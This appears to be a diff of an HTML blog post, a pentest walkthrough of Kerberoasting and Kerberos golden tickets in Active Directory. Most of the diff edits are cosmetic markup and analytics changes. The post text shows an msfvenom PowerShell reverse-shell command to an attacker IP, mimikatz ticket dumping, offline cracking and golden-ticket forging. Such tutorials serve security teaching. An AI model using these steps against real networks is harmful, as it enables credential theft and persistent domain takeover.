@@ -18,6 +18,7 @@
   <link rel="stylesheet" href="https://leonjza.github.io/css/highlight/solarized_light.css">
   <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=PT+Sans:400,400italic,700|Abril+Fatface">
   <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css">
+  
 
   
   <link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://leonjza.github.io/touch-icon-144-precomposed.png">
@@ -30,6 +31,16 @@
 
   <meta name="description" content="">
   <meta name="keywords" content="kerberos,golden ticket,kerberoast,rc4">
+  
+  <script>
+    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+    })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+    ga('create', 'UA-44457032-2', 'auto');
+    ga('send', 'pageview');
+  </script>
   
 </head>
 <body class="theme-base-0d">
@@ -76,7 +87,7 @@
 
 <div class="content container">
   <div class="post">
-    <h1>kerberos, kerberoast and golden tickets</h1>
+    <h1 class="post-title">kerberos, kerberoast and golden tickets</h1>
     <span class="post-date">Jan 9, 2016 &middot; 16 minute read &middot; <a href="https://leonjza.github.io/blog/2016/01/09/kerberos-kerberoast-and-golden-tickets/#disqus_thread">Comments</a>
     
     <br/>
@@ -99,13 +110,13 @@
 
 <p>This post however tries to look at it from a little fresher perspective. There are many posts like this out there, but this one is mine. Mostly just a brain dump that I can refer to later. Many others have written this up (maybe even in greater detail), so definitely have a look around!</p>
 
-<h2 id="lets-set-the-scene:ce81084d40d1d45730db49c3f0a902c4">lets set the scene</h2>
+<h2 id="lets-set-the-scene">lets set the scene</h2>
 
 <p>Kerberos, a network authentication protocol that works off a ticketing type system is deeply baked into Active Directory. Of late, a lot more focus has been put on it by the offensive security community as you will see later in this post. I am not going to go into much (if any) of the technicalities of Kerberos itself as I feel there really is more than enough resources out there you can refer to! The below list references some great posts about the same topic I am writing about there:</p>
 
 <ul>
-<li><a href="https://en.wikipedia.org/wiki/Kerberos_(protocol)">https://en.wikipedia.org/wiki/Kerberos_(protocol)</a></li>
-<li><a href="https://technet.microsoft.com/en-us/library/cc772815(v=ws.10).aspx">https://technet.microsoft.com/en-us/library/cc772815(v=ws.10).aspx</a></li>
+<li>[<a href="https://en.wikipedia.org/wiki/Kerberos_(protocol)](https://en.wikipedia.org/wiki/Kerberos_(protocol)">https://en.wikipedia.org/wiki/Kerberos_(protocol)](https://en.wikipedia.org/wiki/Kerberos_(protocol)</a>)</li>
+<li>[<a href="https://technet.microsoft.com/en-us/library/cc772815(v=ws.10).aspx](https://technet.microsoft.com/en-us/library/cc772815(v=ws.10).aspx">https://technet.microsoft.com/en-us/library/cc772815(v=ws.10).aspx](https://technet.microsoft.com/en-us/library/cc772815(v=ws.10).aspx</a>)</li>
 <li><a href="http://dfir-blog.com/2015/12/13/protecting-windows-networks-kerberos-attacks/">http://dfir-blog.com/2015/12/13/protecting-windows-networks-kerberos-attacks/</a></li>
 <li><a href="https://adsecurity.org/?p=2362">https://adsecurity.org/?p=2362</a></li>
 </ul>
@@ -125,9 +136,9 @@
 
 <p>One last bit of scene setting I think is important is to state the fact that we are going to try and be as quiet as possible now that we have the meterpreter shell up.</p>
 
-<h1 id="spn-scanning-the-setup:ce81084d40d1d45730db49c3f0a902c4">spn scanning - the setup</h1>
+<h1 id="spn-scanning-the-setup">spn scanning - the setup</h1>
 
-<p>One of the avenues we can pursue now is to query Active Directory for objects that have a <a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms677949(v=vs.85).aspx">Service Principal Name</a> set.</p>
+<p>One of the avenues we can pursue now is to query Active Directory for objects that have a [Service Principal Name](<a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ms677949(v=vs.85).aspx">https://msdn.microsoft.com/en-us/library/windows/desktop/ms677949(v=vs.85).aspx</a>) set.</p>
 
 <blockquote>
 <p>A service principal name (SPN) is the name by which a client uniquely identifies an instance of a service. If you install multiple instances of a service on computers throughout a forest, each instance must have its own SPN.</p>
@@ -156,7 +167,7 @@ Registering ServicePrincipalNames for CN=SQL Server,OU=Service Accounts,DC=foo,D
 Updated object
 </code></pre>
 
-<h2 id="spn-scanning-the-offensive-perspective:ce81084d40d1d45730db49c3f0a902c4">spn scanning - the offensive perspective</h2>
+<h2 id="spn-scanning-the-offensive-perspective">spn scanning - the offensive perspective</h2>
 
 <p>Right, with the configuration done, lets put on our offensive hats and try and abuse this. I think one thing that one should realize is that this is a very nice way to get a <em>free port scan</em> done too. You will see in a moment. =]</p>
 
@@ -164,7 +175,7 @@ Updated object
 
 <p>To use the powershell module, the easiest will be to get an interactive powershell session up and running. If you have ever tried this from meterpreter, you will know that if you try and spawn <code>powershell.exe</code> from a cmd shell, you will not get anywhere. Very frustrating. Its not impossible though! We are however going to go through the efforts of getting a working PowerShell session up as we will be using it extensively throughout this post.</p>
 
-<h3 id="setup-a-powershell-connection:ce81084d40d1d45730db49c3f0a902c4">setup a powershell connection</h3>
+<h3 id="setup-a-powershell-connection">setup a powershell connection</h3>
 
 <p>We can use the meterpreter session to get a powershell session. First, we will create a payload to execute as a script using the <code>exec_powershell</code> post module. In a new terminal, run <code>msfvenom -p windows/powershell_reverse_tcp LHOST=192.168.138.150 LPORT=4445 -t raw</code>:</p>
 
@@ -248,7 +259,7 @@ PS C:\Users\bobs\Downloads&gt;
 
 <p>This is the part where I remind you about the <em>free port scan</em> I mentioned earlier. Notice how we have discovered services, ports and accounts running them using just a LDAP query. I highly doubt that will trigger many monitoring tools out there!</p>
 
-<h2 id="kerberos-service-tickets:ce81084d40d1d45730db49c3f0a902c4">kerberos service tickets</h2>
+<h2 id="kerberos-service-tickets">kerberos service tickets</h2>
 
 <p>We now have 2 SPN&rsquo;s that we managed to query off the domain. <code>svcSQLServ/pc1.foo.local:1433</code> &amp; <code>svcSQLServ/pc2.foo.local:1433</code>. In order for clients to be able to authenticate to the services running as this user via kerberos, they would typically go through the process of requesting a service ticket.</p>
 
@@ -256,7 +267,7 @@ PS C:\Users\bobs\Downloads&gt;
 
 <p>What does that mean for an attacker? Well, we can request the service ticket&hellip; and&hellip; attempt to decrypt it by brute forcing it offline! If the decryption is successful, then we have successfully compromised a service account.</p>
 
-<h2 id="enter-kerberoast:ce81084d40d1d45730db49c3f0a902c4">enter kerberoast</h2>
+<h2 id="enter-kerberoast">enter kerberoast</h2>
 
 <p><a href="https://github.com/nidem/kerberoast">Kerberoast</a> is a tool that can amongst other things, crack Kerberos ticket passwords. The general idea is that we get the SPN&rsquo;s (like we did), request kerberos service tickets for them, dump the ticket out of memory and send it to the <code>tgsrepcrack.py</code> script to crack against a wordlist.</p>
 
@@ -346,7 +357,7 @@ PS C:\&gt; Find-PSServiceAccounts -DumpSPNs | ForEach-Object { New-Object System
 </figure>
 
 
-<h2 id="dumping-kerberos-tickets-from-memory:ce81084d40d1d45730db49c3f0a902c4">dumping kerberos tickets from memory</h2>
+<h2 id="dumping-kerberos-tickets-from-memory">dumping kerberos tickets from memory</h2>
 
 <p>Remember, all of the actions performed thus far have been as a normal AD user with no special privileges. With the tickets now in memory, we can dump them to a file using mimikatz again. The mimikatz command we will use for this is <code>kerberos::list /export</code>:</p>
 
@@ -361,7 +372,7 @@ PS C:\&gt; Find-PSServiceAccounts -DumpSPNs | ForEach-Object { New-Object System
 
 <p><code>1-40a10000-bobs@svcSQLServ~pc1.foo.local~1433-FOO.LOCAL.kirbi</code> is the Kerberos ticket dumped to disk! We can now transfer this to some place where we have Kerberoast downloaded and start cracking it! :D</p>
 
-<h2 id="cracking-the-kerberos-ticket:ce81084d40d1d45730db49c3f0a902c4">cracking the kerberos ticket</h2>
+<h2 id="cracking-the-kerberos-ticket">cracking the kerberos ticket</h2>
 
 <p>Back at my meterpreter session, we can simply download the ticket locally, and start the crack. <code>tgsrepcrack.py</code> allows you to specify tickets with a wildcard, so it will run the wordlist recursively over all of the tickets in a directory.</p>
 
@@ -425,7 +436,7 @@ The command completed successfully.
 PS C:\&gt;
 </code></pre>
 
-<h2 id="testing-the-credentials:ce81084d40d1d45730db49c3f0a902c4">testing the credentials</h2>
+<h2 id="testing-the-credentials">testing the credentials</h2>
 
 <p>For a bit of fun, lets test the credentials we just got using PowerShell Remoting. PowerShell Remoting is on by default on Server 2012 I believe.</p>
 
@@ -449,7 +460,7 @@ Invoke-Command -ScriptBlock {get-process} -ComputerName dc1 -Credential $creds
 
 <p>So, we popped a service account with waaaay too much permissions and a crappy password. All that as a normal AD user&hellip;</p>
 
-<h1 id="golden-tickets:ce81084d40d1d45730db49c3f0a902c4">golden tickets</h1>
+<h1 id="golden-tickets">golden tickets</h1>
 
 <p>We have domain administrative rights now. There is nothing left to do, we can write the pentest report and go home. Or can we? Well yes, but what if the password to <code>svcSQLServ</code> changes? That would mean we lose access! One way we can prevent this is by creating a <em>golden ticket</em> that we can re-use to grant ourselves whatever permission we like, as any user we like! Sounds great eh :D</p>
 
@@ -514,7 +525,7 @@ svcSQLServ
 <li>A username (fake or real, does not matter. Not fake if you need opsec ofc!). <code>darthvader</code></li>
 </ul>
 
-<h2 id="creating-the-golden-ticket:ce81084d40d1d45730db49c3f0a902c4">creating the golden ticket</h2>
+<h2 id="creating-the-golden-ticket">creating the golden ticket</h2>
 
 <p>Creating the golden ticket is now a really simple task. We will simply call <code>Invoke-Mimikatz</code> again to generate the ticket. It will be saved to disk when it is generated. Thereafter, we will purge all the tickets we have for the session, and inject the golden ticket and test our access!</p>
 
@@ -534,7 +545,7 @@ svcSQLServ
 </figure>
 
 
-<h2 id="injecting-the-golden-ticket:ce81084d40d1d45730db49c3f0a902c4">injecting the golden ticket</h2>
+<h2 id="injecting-the-golden-ticket">injecting the golden ticket</h2>
 
 <p>The final test is to <em>use</em> this ticket. For that, we will purge all Kerberos tickets in memory and inject the new golden ticket. Thereafter we will test if we can read the administrative <code>c$</code> share of the Domain Controller!</p>
 
@@ -561,16 +572,16 @@ Ticket(s) purge for current session is OK
 
 <p>After the ticket is injected into memory, we can verify its existence with the mimikaz <code>kerberos::list</code> command, or just using <code>klist</code>. Once it is injected, we <code>dir</code> the Domain Controllers <code>c$</code> share&hellip; an <em>smile</em>. The password for <code>scvSQLServ</code> can now change, it will no longer bother us!</p>
 
-<p>
+
 <figure >
     
         <img src="https://leonjza.github.io/images/kerberos_golden_ticket_admin.png" />
     
     
 </figure>
-</p>
 
-<h2 id="conclusion:ce81084d40d1d45730db49c3f0a902c4">conclusion</h2>
+
+<h2 id="conclusion">conclusion</h2>
 
 <p>In this post we saw how it is possible to &lsquo;crack&rsquo; badly passworded and configured service accounts by querying for accounts by Service Principal Names. Those SPN&rsquo;s were then used to request Service Tickets from the Domain Controller, extracted from memory and cracked offline. All of that as a normal domain user.</p>
 
@@ -608,14 +619,6 @@ var disqus_shortname = "slashnote";
 
 <script src="https://leonjza.github.io/js/highlight.pack.js"></script>
 <script>hljs.initHighlightingOnLoad();</script>
-
-<script>
-  var _gaq=[['_setAccount','UA-44457032-2'],['_trackPageview']];
-  (function(d,t){var g=d.createElement(t),s=d.getElementsByTagName(t)[0];
-  g.src=('https:'==location.protocol?'//ssl':'//www')+'.google-analytics.com/ga.js';
-  s.parentNode.insertBefore(g,s)}(document,'script'));
-</script>
-
 </body>
 </html>
 
